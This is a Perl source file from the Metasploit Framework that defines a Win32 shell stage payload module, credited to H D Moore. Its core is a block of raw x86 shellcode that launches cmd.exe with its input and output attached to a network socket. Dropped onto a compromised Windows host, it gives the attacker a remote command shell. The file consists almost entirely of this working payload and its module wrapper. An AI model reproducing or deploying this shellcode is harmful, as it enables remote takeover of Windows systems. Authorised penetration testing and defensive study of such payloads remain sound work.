package Msf::PayloadComponent::Win32ShellStage;
use strict;
use base 'Msf::PayloadComponent::Win32StagePayload';

sub import {
  my $class = shift;
  $class->SUPER::import(@_);
}

my $info =
{
    'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Priv'         => 0,

    # win32 specific code
    'Win32StagePayload' =>
    {
        Offsets => { EXITFUNC => [103, 'V'] },
        Payload =>        
        "\x68\x43\x4d\x44\x00\x89\xe3\x87\xfa\x31\xc0\x8d\x7c\x24\xac\x6a".
        "\x15\x59\xf3\xab\x87\xfa\x83\xec\x54\xc6\x44\x24\x10\x44\x66\xc7".
        "\x44\x24\x3c\x01\x01\x89\x7c\x24\x48\x89\x7c\x24\x4c\x89\x7c\x24".
        "\x50\x8d\x44\x24\x10\x54\x50\x51\x51\x51\x41\x51\x49\x51\x51\x53".
        "\x51\xff\x75\x00\x68\x72\xfe\xb3\x16\xff\x55\x04\xff\xd0\x89\xe6".
        "\xff\x75\x00\x68\xad\xd9\x05\xce\xff\x55\x04\x89\xc3\x6a\xff\xff".
        "\x36\xff\xd3\xff\x75\x00\x68\x7e\xd8\xe2\x73\xff\x55\x04\x31\xdb".
        "\x53\xff\xd0"
    }
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}
